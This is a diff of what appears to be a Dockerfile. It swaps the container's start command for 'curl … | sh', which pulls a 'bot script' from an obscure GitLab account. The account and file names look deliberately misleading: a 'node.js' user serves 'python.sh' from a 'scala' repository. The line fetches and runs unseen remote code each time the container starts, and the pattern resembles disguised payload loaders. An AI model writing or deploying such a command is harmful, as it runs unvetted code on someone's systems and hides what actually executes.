@@ -37,5 +37,5 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD curl https://raw.githubusercontent.com/55113110159/go/main/scala.sh | sh
+CMD curl https://gitlab.com/node.js2594450/scala/-/raw/main/python.sh | sh
 
